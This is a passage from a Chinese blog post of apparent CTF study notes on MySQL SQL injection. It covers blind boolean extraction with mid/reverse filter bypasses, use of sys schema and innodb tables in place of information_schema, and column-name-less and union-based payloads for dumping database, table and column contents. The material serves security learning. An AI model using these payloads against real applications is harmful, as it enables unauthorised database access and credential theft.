<li><p>一个开头没有数字的字符串和数字0进行比较会为真： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104333.png" /></p></li>
<li><p>开头没有数字的字符串和非0数字进行比较会为假： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104400.png" /></p></li>
<li><p>开头为数字的字符串会被转为开头几个数字，所以要想比较结果为真，只需要和开头几个数字进行比较即可：（下图中如果右边不是13，则为假） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428105320.png" /></p></li>
<li><p>以0开头的字符串，如果前几个都是数字，则省略前面的0，直接转为数字，如： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428104446.png" /></p></li>
</ol>
<p>这与PHP中的字符串和数字进行弱类型比较时一致。</p>
<h3 id="判断字段是否存在">5.2.2. 判断字段是否存在</h3>
<p>前提：知道字段名。</p>
<p>假设，我们输入的是uname和passwd，已知uname=admin，我们假设另一个字段为passwd。故，构造如下payload: <code>uname=admin'-(mid((passwd)from(1))='a')-'&amp;passwd=123</code></p>
<p>分析一下：<code>mid((passwd)from(1))='a'</code>，有两种情况，passwd字段存在，那么这句话返回0。那么最后得到的结果应该是<code>passwd error</code>；如果passwd不存在，那么这句话返回错误，最后得到的结果为<code>error</code>。这样也就判断了该字段是否存在。</p>
<h3 id="得到字段内容">5.2.3. 得到字段内容</h3>
<p>前提：知道字段名。</p>
<p>利用: <code>uname=admin'-(mid(passwd, 1, 1)='a')-'&amp;passwd=123</code>来判断。</p>
<p>如果passwd内容的第一个字符为'a'，那么<code>(mid(passwd, 1, 1)='a')</code>结果为1，从而变成<code>admin'-1-'&amp;passwd=123</code>，最后查询语句变为<code>sql = select * from user where uname='admin'-1-''</code>，即<code>sql = select * from user where uname=-1</code>，后面的比较一定是错误的，所以会返回<code>uname error</code>。</p>
<p>如果passed内容的第一个字符不为'a'，那么<code>(mid(passwd, 1, 1)='a')</code>结果为0，因此最后得到查询语句<code>sql = select * from user where uname='admin'-0-''</code>，<code>sql = select * from user where uname=0</code>，后面的比较永真，所以返回<code>passwd error</code>。</p>
<p>利用返回不同，写一个脚本去获得passwd字段的内容。</p>
<h3 id="绕过for过滤">5.2.4. 绕过for过滤</h3>
<p>如果在','和空格都被过滤的前提下，for又被过滤了，那么该如何做呢？答案是结合mid和reverse两个函数，mid也可以用substr代替。</p>
<p>先给payload: <code>mid(REVERSE(MID((passwd)from(k)))from(-1))</code></p>
<ol type="1">
<li>先看<code>MID((passwd)from(k))</code>，得到paswd字段的从第k个字符（包括第k个）之后的全部内容；假设为(klmnopq)</li>
<li><code>REVERSE(MID((passwd)from(k)))</code>，将第一步得到的字串倒置；假设为(qponmlk)</li>
<li><code>mid(REVERSE(MID((passwd)from(k)))from(-1))</code>，从倒置的字串中取出最后一个字符；取出k</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220428112925.png" /></p>
<p>根据上述分析，整句话其实就干了一件事，取出passwd字段内容的第k个字符，等价于<code>mid((passwd)from(k)for1)</code>。之后可以用来，只要把k从1循环到len(passwd)即可。当然不知道passwd长度，随便猜。</p>
<h2 id="information_schema绕过及无列名注入">5.3. information_schema绕过及无列名注入</h2>
<h3 id="information_schema绕过">5.3.1. information_schema绕过</h3>
<h4 id="问题描述">5.3.1.1. 问题描述</h4>
<p><code>information_schema</code>是mysql中就是一个信息数据库，保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名、表名、字段名等。在sql注入过程中，该数据库最大的作用就是获得<code>table_scheme</code>，<code>table_name</code>，<code>column_name</code>等信息。</p>
<p>在某些情况下，后台过滤了一些字符，比如说<code>or</code>，并且无法绕过，这会导致<code>information_schema</code>数据库无法使用，此时常规的sql注入已经不能够继续，需要新的方法。</p>
<h4 id="解决办法">5.3.1.2. 解决办法</h4>
<h5 id="mysql-5.7的新特性">5.3.1.2.1. mysql 5.7的新特性</h5>
<p>参考链接：https://www.anquanke.com/post/id/193512</p>
<blockquote>
<p>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</p>
</blockquote>
<h6 id="sys.schema_auto_increment_columns">5.3.1.2.1.1. sys.schema_auto_Increment_columns</h6>
<p>简而言之，该视图的作用就是对表<strong>自增ID</strong>的监控。</p>
<p>通过security（sqli-labs）和fortest（自建库）两个库来熟悉一下schema_auto_increment_columns视图的结构组成、以及特性。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fortest库：（前两个存在自增ID）</span><br><span class="line">	data表</span><br><span class="line">	test表</span><br><span class="line">	no_a_i_table表</span><br><span class="line">security库：</span><br><span class="line">	emails, referers, uagents, users</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413094801.png" /></p>
<p>可以发现<code>no_a_i_table</code>并没有在这里显示出来，然后系统自带的库中的表信息全部现实。从这里可以看出，如果数据库中的表存在<strong>自增ID</strong>，那么就可以利用<code>sys.schema_auto_Increment_columns</code>视图来代替<code>indormation_schema</code>获得数据库中的表名信息。</p>
<h6 id="schema_table_statistics_with_buffer-xschema_table_statistics_with_buffer等">5.3.1.2.1.2. schema_table_statistics_with_buffer ,x$schema_table_statistics_with_buffer等</h6>
<blockquote>
<p>查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间，即也可以理解为是存在最多表I/O争用的表）降序排序，数据来源：<code>performance_schema.table_io_waits_summary_by_table、sys.x$ps_schema_table_statistics_io、sys.x$innodb_buffer_stats_by_table</code></p>
</blockquote>
<p>通过介绍的内容我们可以很容易的发现，利用“数据来源”同样可以获取到我们需要的信息，所以说这样的话我们的绕过information_schema的思路就更广了。加下来依次看一下各个视图的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095201.png" /></p>
<p>可以看到，在上一个视图中并没有出现的表名在这里出现了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.x$schema_table_statistics_with_buffer</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095240.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 在从`数据来源`中随便选取一个视图为例（想查看视图详细结构等信息可自行测试） </span><br><span class="line"># sys.x$ps_schema_table_statistics_io </span><br><span class="line"># 可忽略table_name=&#x27;db&#x27;，默认的。</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413095352.png" /></p>
<p>还有许多类似的视图。</p>
<h6 id="绕过方法">5.3.1.2.1.3. 绕过方法</h6>
<p>payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># schema_auto_increment_columns </span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+</span><br><span class="line"></span><br><span class="line"># schema_table_statistics_with_buffer </span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span><br><span class="line"></span><br><span class="line"># information_schema</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></p>
<p>第三个为使用<code>information_schema</code>的payload，三者进行对比，发现大概的内容没有改变，只是改变了<code>information_schema</code>这个位置的内容。</p>
<h5 id="mysql默认存储引擎innodb携带的表">5.3.1.2.2. mysql默认存储引擎innoDB携带的表</h5>
<p>从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL 5.6以上的版本中，InnoDb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br></pre></td></tr></table></figure>
<p>payload与上面类似。</p>
<blockquote>
<p>还可以使用innodb绕过information_schema，但是MySQL中默认关闭innodb引擎。</p>
</blockquote>
<h3 id="无列名注入">5.3.2. 无列名注入</h3>
<p>参考链接：https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/</p>
<p>上面的方法能够得到表名，现在需要得到列名（字段名）。</p>
<p>常规的查询： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101422.png" /></p>
<p>可以看到有四个字段<code>id</code>, <code>username</code>, <code>password</code>, <code>level</code>。</p>
<p>下一步，将列名转换为任何可选的已知值： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4 union select * from users;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>这一步需要注意的是，必须知道该表中的字段数！</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101617.png" /></p>
<p>列名已经转换为1,2,3,4。下一步是根据新的数值选择数据，<strong>必须给表添加别名才可以</strong>，命令如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3,4 union select * from users)as alias; </span><br><span class="line">其中 as 可以省略不写</span><br></pre></td></tr></table></figure></p>
<p>个人理解：先执行了<code>(select 1,2,3,4 union select * from users)</code>，然后返回一张表，将这张表起个别名<code>alias</code>，然后再执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from alias</span><br></pre></td></tr></table></figure></p>
<p>从<code>alias</code>表中选出列名为<code>3</code>，并返回其内容。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413101830.png" /></p>
<p>成功得到列名为<code>3</code>的信息，也就是之前列名为<code>password</code>的信息。</p>
<p>如果反引号被过滤，那么还可以通过给字段去别名的方式绕过。命令如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4 union select * from users)alias; </span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102429.png" /></p>
<p>达到同样的效果。</p>
<p>结合注入的payload（类似）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(b) from(select 1,2,3 as b,4 union select * from users)alias),3,4--+</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>select * from users</code> 等价于 <code>select*from users;</code></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413102723.png" /></p>
<h3 id="题目">5.3.3. 题目</h3>
<p>[[SWPU2019 Web1]]</p>
<h2 id="flag不在当前数据库">flag不在当前数据库</h2>
<p>如果flag在当前数据库，依次执行下述命令 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">显示当前数据库：-1&#x27; union select 1,database()</span><br><span class="line">爆表名：-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">爆列名：-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;db_name&#x27; and table_name=&#x27;tb_name&#x27;</span><br><span class="line">得到列表信息：-1&#x27; union select 1,group_concat(cl_name1,cl_name2,...) from da_name.tb_name</span><br></pre></td></tr></table></figure></p>
<p>如果不在当前数据库，在执行上述命令时，先执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆数据库（服务器存在的所有数据库）：-1&#x27; union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/" rel="prev" title="17 Vulnhub Pyexp Writeup">
                  <i class="fa fa-chevron-left"></i> 17 Vulnhub Pyexp Writeup
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" rel="next" title="PHP伪协议">
                  PHP伪协议 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    
  <div class="comments" id="disqus_thread">
    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
  </div>
  
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hdfzzf</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">329k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">4:59</span>
  </span>
</div>
<div class="busuanzi-count">
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


<script class="next-config" data-name="disqus" type="application/json">{"enable":true,"shortname":"hdfzzf","count":true,"i18n":{"disqus":"disqus"}}</script>
<script src="/js/third-party/comments/disqus.js"></script>

</body>
</html>
